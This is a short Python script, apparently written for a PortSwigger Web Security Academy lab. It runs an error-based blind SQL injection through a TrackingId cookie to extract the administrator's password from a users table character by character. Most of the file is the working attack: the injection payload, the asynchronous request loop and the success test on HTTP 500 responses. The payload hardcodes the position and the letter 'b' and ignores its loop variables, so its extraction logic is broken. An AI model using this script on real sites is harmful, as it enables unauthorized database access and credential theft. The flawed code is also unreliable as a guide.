import asyncio
import aiohttp

BASE_URL = "https://0a2d0071033fa28880e0622f006500ac.web-security-academy.net"
FILTER_URL = BASE_URL + "/filter"
# WORD_LIST = "0123456789abcdefghijklmnopqrstuvwxyz"
WORD_LIST="abc"

async def find_pw(pw_len: int) -> str:
    async with aiohttp.ClientSession() as session:
        tasks = [find_char(session, pos) for pos in range(1, pw_len + 1)]
        results = await asyncio.gather(*tasks)
        return "".join(results)

async def find_char(session: aiohttp.ClientSession, pos: int) -> str:
    for word in WORD_LIST:
        payload = f"'||(SELECT CASE WHEN (SUBSTR(username,1,1) = 'b') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
        if await is_payload_500(session, payload):
            print(f"pos:{pos}, word:{word}===")
            return word
    return "?"

async def is_payload_500(session: aiohttp.ClientSession, payload: str) -> bool:
    cookies = {
        "TrackingId": "EnCibfUSVeQ634km" + payload,
        "session": "FFmcaPeu7KLoJ3E3u9V4ugtf6kdbK10k"
    }
    params = {"category": "Gifts"}
    try:
        async with session.get(BASE_URL, cookies=cookies, params=params, timeout=10, allow_redirects=False) as resp:
            print(f"Payload: {payload}, Status: {resp.status}")
            return resp.status == 500
    except Exception as e:
        print(f"Error with payload {payload}: {str(e)}")
        return False

async def main():  # ✅ 改為 async 函數
    pw = await find_pw(3)  # ✅ 加上 await
    print(f"[+] Found password: {pw}")

if __name__ == "__main__":  # ✅ 修正語法錯誤
    asyncio.run(main())  # ✅ 使用 asyncio.run() 執行 async main